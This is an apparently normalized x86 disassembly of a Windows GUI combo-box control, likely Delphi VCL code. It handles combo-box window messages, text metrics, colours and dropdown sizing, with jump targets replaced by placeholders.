je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_432261
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_441780
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_441780
mov eax [ ebx + 0x180 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_4322d4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x1
xor eax eax
push ebp
push sub_432313
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4415b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43231a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] 0x0
retn
sub_43231a
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x215 ]
mov eax [ ebp - 0x4 ]
call sub_431f0c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_432394
pop ecx
pop ebp
retn
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20d ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call SendMessageA
sub_432394
push ebx
mov ebx eax
cmp [ ebx + 0x20f ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_4323d0
pop ebx
retn
sub_4323d0
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_41d414
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1a5 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
shl eax 0x2
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_43d5d8
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx
mov ebx eax
jmp r-xdata
sub_43249c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_442170
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_4324d4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_4445f8
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_4445f8
push eax
call SendMessageA
sub_432514
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_443c10
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_432394
mov eax ebx
call sub_441b98
sub_432548
push ebx
mov ebx eax
mov eax ebx
call sub_443b54
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_4323d0
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_432590
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4439ac
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_4445f8
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_432054
sub_4325cc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4448fc
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_40349c
push 0xfffffff0
mov eax esi
call sub_4445f8
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_432604
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_4456f8
pop esi
pop ebx
retn
sub_43263c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4326a2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_4445f8
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4326a9
lea eax [ ebp - 0x4 ]
call sub_404074
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_414e08
sub_4326b4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_4445f8
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4326d8
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x10 ]
call sub_4445f8
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_4046c0
mov edx esi
xchg edx eax
call sub_4046c0
mov eax [ esi ]
call sub_404534
push eax
push edi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_4445f8
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_432730
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_432794
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_43ddf8
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_4445f8
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_43de28
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43279b
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_4327a0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x10 ]
call sub_4445f8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4327c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404534
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_4445f8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4327e8
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_4445f8
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_43e334
sub_43281c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43288f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404534
push eax
push 0x0
push 0x143
mov eax [ ebx + 0x10 ]
call sub_4445f8
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432896
lea eax [ ebp - 0x4 ]
call sub_404074
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
sub_4328a0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_432913
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_404534
push eax
push esi
push 0x14a
mov eax [ ebx + 0x10 ]
call sub_4445f8
push eax
call SendMessageA
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43291a
lea eax [ ebp - 0x4 ]
call sub_404074
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
sub_432920
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_440324
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_43d5b4
mov edx 0x19
mov eax ebx
call sub_43d5d8
mov dl 0x1
mov eax ebx
call sub_44482c
xor edx edx
mov eax ebx
call sub_43dfbc
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dd3c
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43c9d4
mov [ ebx + 0x238 ] 0x10
push ebx
push sub_432cc4
call sub_41b174
mov [ ebx + 0x24c ] eax
push ebx
push sub_432dbc
call sub_41b174
mov [ ebx + 0x254 ] eax
mov [ ebx + 0x210 ] 0x8
mov [ ebx + 0x214 ] 0xffffffff
mov [ ebx + 0x260 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_432a14
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax esi
call sub_4448fc
test al al
je r-xdata
mov eax [ esi + 0x254 ]
call sub_4550f0
mov eax [ esi + 0x24c ]
call sub_4550f0
mov eax [ esi + 0x208 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_440448
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_432a96
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_4419ec
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
xor eax eax
mov [ ebx + 0x248 ] eax
pop ebx
retn
sub_432ae0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_432b04
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
xor eax eax
mov al bl
push eax
push 0x14f
mov eax esi
call sub_4445f8
push eax
call SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_4445f8
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_432b4c
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop ebx
retn
mov eax [ ebx + 0x214 ]
pop ebx
retn
sub_432b78
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x214 ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
sub_432bb4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
cmp esi [ ebx + 0x20c ]
je r-xdata
xor esi esi
pop esi
pop ebx
retn
mov [ ebx + 0x20c ] esi
mov eax ebx
call sub_4448fc
test al al
je r-xdata
push 0x0
push esi
push 0x141
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
sub_432c04
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_4445f8
push eax
call SetWindowTextA
sub_432c40
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_432ae0
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_432c78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_443c10
pop esi
pop ebx
retn
mov eax ebx
call sub_441b98
sub_432c9c
push ebx
mov ebx eax
mov eax ebx
call sub_43f9e8
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_432cc4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ esi ] 0x112
jne r-xdata
mov eax [ esi ]
cmp eax 0x100
jb r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov eax [ ebx + 0x250 ]
push eax
mov edx esi
mov ecx [ ebx + 0x240 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xf4 ]
mov eax [ esi ]
sub eax 0x30
je r-xdata
cmp eax 0x108
ja r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub eax 0x1d1
je r-xdata
mov eax ebx
call sub_455244
mov edi eax
test edi edi
je r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
sub eax 0x2
jne r-xdata
mov ecx esi
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax ebx
call sub_43d93c
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406b20
push eax
push 0x0
push 0x202
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_43e4b8
jmp r-xdata
sub_432df0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4330a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x244 ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44344c
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_443534
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_432ae0
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45e9f0
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_40349c
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_455244
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_430fe8
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4435fc
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
push esi
call MapWindowPoints
mov ax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
mov ax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov di [ ebx + 0x4 ]
cmp di 0xd
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_432ae0
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov [ ebx + 0xc ] 0xffffffff
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_432b04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4330cc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
sub eax 0x5
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub eax 0xfd
je r-xdata
mov eax ebx
call sub_43e580
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
mov edx esi
mov eax ebx
call sub_44200c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4435fc
test al al
jne r-xdata
add eax 0xffffffd0
sub eax 0x7
jb r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
cmp di 0xd
je r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41cf40
push eax
mov eax [ esi + 0x4 ]
push eax
call SetTextColor
mov eax [ ebx + 0x170 ]
call sub_41dbe4
call sub_41cf40
push eax
mov eax [ esi + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0x170 ]
call sub_41dc20
mov [ esi + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_441f78
test al al
jne r-xdata
mov eax ebx
call sub_432ae0
test al al
je r-xdata
cmp di 0x1b
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
xor edx edx
mov eax ebx
call sub_432b04
jmp r-xdata
sub_4331da
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_433338
push [ fs : eax ]
mov [ fs : eax ] esp
movzx eax [ edx + 0x6 ]
cmp eax 0x8
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43333f
lea eax [ ebp - 0x4 ]
call sub_404074
retn
jmp [ eax * 4 + jump_table_433208 ]
mov eax edi
mov si 0xffe9
call sub_40349c
jmp r-xdata
mov eax edi
mov si 0xffb3
call sub_40349c
jmp r-xdata
mov [ edi + 0x25d ] 0x0
mov eax edi
mov si 0xffb1
call sub_40349c
mov eax edi
mov edx [ eax ]
call [ edx + 0xf0 ]
cmp [ edi + 0x25d ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ edi + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43de28
mov eax edi
mov si 0xffeb
call sub_40349c
mov eax edi
mov si 0xffb2
call sub_40349c
jmp r-xdata
mov eax edi
mov si 0xffb0
call sub_40349c
jmp r-xdata
mov [ edi + 0x25e ] 0x1
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_442d7c
jmp r-xdata
mov [ edi + 0x25e ] 0x0
mov [ edi + 0x25d ] 0x1
mov eax edi
call sub_442e68
push 0x0
push 0x0
push 0x1f
mov eax edi
call sub_4445f8
push eax
call PostMessageA
cmp [ edi + 0x25e ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x14f
mov eax edi
call sub_4445f8
push eax
call PostMessageA
jmp r-xdata
sub_43336c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_433415
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
call sub_43c9ec
cmp [ ebx + 0x282 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x208 ]
call sub_41dfc4
test esi esi
jl r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x284 ]
call [ ebx + 0x280 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43341c
lea eax [ ebp - 0x14 ]
call sub_404074
retn
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebx + 0x23c ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x10 ]
add edx 0x2
mov ecx [ ebp - 0xc ]
mov eax [ ebx + 0x208 ]
call sub_41e1b0
sub_433448
push esi
push edi
mov esi eax
mov eax esi
call sub_43fecc
mov edi [ esi + 0x214 ]
cmp edi 0xffffffff
je r-xdata
pop edi
pop esi
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_433470
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4448fc
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_4334c4
push ebx
push esi
cmp [ eax + 0x222 ] 0x0
je r-xdata
mov si 0xffb3
call sub_40349c
pop esi
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
pop esi
pop ebx
retn
sub_4334f0
push ebx
mov ebx eax
mov eax ebx
call sub_4415b0
push 0x0
mov eax [ ebx + 0x20c ]
push eax
push 0x141
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
xor eax eax
mov [ ebx + 0x240 ] eax
xor eax eax
mov [ ebx + 0x244 ] eax
pop ebx
retn
sub_433528
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
cmp ebx eax
jle r-xdata
cmp ebx 0x1
jge r-xdata
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_4335be
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x9e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xfc ]
imul ebx
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x4c ]
add eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4335c5
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
mov ebx 0x1
sub_4335c5
push 0x5f
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
push eax
call SetWindowPos
pop ebx
pop ecx
pop ebp
retn
sub_4335e4
push esi
push edi
mov esi eax
mov edi [ esi + 0x23c ]
test edi edi
je r-xdata
mov [ esi + 0x23c ] edx
pop edi
pop esi
retn
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_433614
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_433693
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43369a
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_4336a0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4336e0
push ebp
mov ebp esp
push ecx
push ebx
